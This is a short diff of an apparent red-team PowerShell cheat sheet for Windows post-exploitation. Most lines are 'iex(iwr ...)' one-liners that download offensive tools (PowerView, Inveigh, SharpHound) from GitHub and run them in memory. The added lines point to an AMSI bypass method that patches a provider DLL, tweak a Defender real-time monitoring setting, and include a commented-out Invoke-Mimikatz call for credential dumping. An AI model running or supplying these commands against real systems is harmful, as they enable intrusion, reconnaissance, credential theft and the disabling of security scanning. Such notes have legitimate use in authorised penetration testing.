@@ -31,11 +31,13 @@ Invoke-AllChecks
 iex( iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1 -usebasicparsing)
 Get-NetLocalGroupMember
 
-# user context ok
-https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell
-
 # admin privs required
 iex( iwr https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1 -usebasicparsing)
 
 # user context ok
 iex( iwr https://github.com/BloodHoundAD/BloodHound/raw/master/Collectors/SharpHound.ps1 -usebasicparsing)
+
+# user context ok
+https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell (Copy First Method: Patch the providers DLL)
+Set-MPPreference -DisableRealtimeMonitoring $false
+#Invoke-Mimikatz
